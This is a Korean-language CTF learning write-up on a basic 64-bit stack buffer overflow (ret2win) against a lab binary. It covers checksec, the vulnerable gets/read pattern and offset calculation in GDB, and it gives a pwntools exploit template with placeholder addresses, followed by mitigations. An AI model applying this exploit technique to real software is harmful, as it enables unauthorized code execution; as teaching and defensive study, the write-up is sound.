# BOF01 라이트업 - Stack BOF 기본형

## 1. 개요

BOF01은 스택 버퍼 오버플로우의 가장 기본적인 흐름을 정리한 학습형 라이트업이다. 핵심은 입력 길이 검증이
없는 함수에서 지역 버퍼를 초과해 saved RBP와 return address 근처까지 덮을 수 있는지 확인하고, 제어 흐름을
의도한 함수로 바꾸는 것이다.

이 문서는 실제 서비스가 아니라 CTF/교육용 바이너리 분석을 기준으로 작성했다. 주소, 플래그, 민감 문자열은
포트폴리오 공개용으로 남기지 않는다.

## 2. 분석 목표

| 항목 | 내용 |
| --- | --- |
| 취약점 유형 | Stack Buffer Overflow |
| 입력 지점 | 표준 입력 또는 argv |
| 핵심 목표 | offset 계산 후 return address overwrite |
| 사용 도구 | checksec, GDB/pwndbg, Python, pwntools |
| 학습 포인트 | 스택 프레임, saved RBP, RET, 엔디언, payload 구조 |

## 3. 분석 루틴

```text
보호기법 확인
  -> 입력 함수 확인
  -> 버퍼 크기와 스택 프레임 확인
  -> cyclic pattern으로 offset 계산
  -> 목표 함수 주소 확인
  -> payload 작성
  -> GDB에서 RET 변경 여부 검증
```

## 4. 보호기법 확인

```bash
checksec ./bof01
```

BOF01 기본형에서는 보통 Canary가 없고 PIE가 꺼져 있는 형태를 먼저 연습한다. 이 상태에서는 함수 주소가
고정되어 있어 `win()` 또는 `shell()` 같은 목표 함수 주소로 return address를 덮는 방식이 가능하다.

```text
Canary: No
NX: Enabled
PIE: No
```

NX가 켜져 있어도 직접 shellcode를 스택에 올려 실행하지 않고, 이미 바이너리 안에 있는 함수를 호출한다면
기본 ret2win 흐름으로 풀이할 수 있다.

## 5. 취약 함수 확인

IDA 또는 GDB disassemble로 입력 처리 함수를 확인한다.

```c
char buf[64];
gets(buf);
```

또는 다음과 같은 형태가 취약 지점이 된다.

```c
char buf[64];
read(0, buf, 200);
```

버퍼는 64바이트인데 입력은 그보다 크게 받을 수 있으므로, 스택에서 `buf -> saved RBP -> RET` 순서로
덮이는지 확인한다.

## 6. offset 계산

GDB에서 cyclic pattern을 넣고 크래시 지점을 확인한다.

```bash
python3 - <<'PY'
from pwn import *
print(cyclic(120).decode())
PY
```

```gdb
run
x/gx $rsp
```

크래시 후 RET 위치에 들어간 패턴을 `cyclic -l`로 계산한다.

```bash
cyclic -l <crash_pattern>
```

예시 구조:

```text
payload = b"A" * <offset>
payload += p64(<target_function>)
```

## 7. 목표 함수 주소 확인

PIE가 꺼져 있으면 `nm`이나 `objdump`로 함수 주소를 확인할 수 있다.

```bash
nm -n ./bof01 | grep -E "win|shell|flag"
objdump -d ./bof01 | grep "<win>"
```

주소는 공개 포트폴리오에서 실제 값 대신 `<win_address>`로 기록한다.

## 8. exploit 작성

```python
from pwn import *

binary = "./bof01"
elf = ELF(binary)

offset = <offset>
target = elf.symbols["win"]

p = process(binary)
payload = b"A" * offset
payload += p64(target)

p.sendline(payload)
p.interactive()
```

원격 문제라면 `process()` 대신 `remote(host, port)`로 바꿔 실행한다.

## 9. 검증 포인트

- 크래시가 단순 segmentation fault인지, RET overwrite까지 도달했는지 확인
- offset이 saved RBP가 아니라 return address 기준인지 확인
- 64-bit 바이너리에서는 `p64()`, 32-bit 바이너리에서는 `p32()` 사용
- 함수 호출 전 stack alignment 문제가 있으면 `ret` gadget을 하나 추가
- 플래그 값은 보고서에 직접 남기지 않고 성공 조건만 기록

## 10. 대응 방안

- `gets`, `strcpy`, 제한 없는 `scanf("%s")` 사용 금지
- 입력 길이 제한과 서버 측 검증 적용
- Canary, PIE, NX, RELRO 등 보호기법 활성화
- 컴파일 단계에서 `-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2` 적용
- 크래시 로그와 비정상 입력 길이 모니터링

## 11. 학습한 점

- BOF 기본형은 페이로드보다 스택 프레임을 정확히 이해하는 것이 먼저다.
- offset 계산은 감으로 하는 것이 아니라 cyclic pattern과 GDB로 검증해야 한다.
- NX가 켜져 있어도 기존 함수로 흐름을 돌리는 ret2win 방식은 가능하다.
- 포트폴리오에는 정답 문자열보다 분석 루틴, offset 산출 근거, 대응 방안을 남기는 편이 더 좋다.
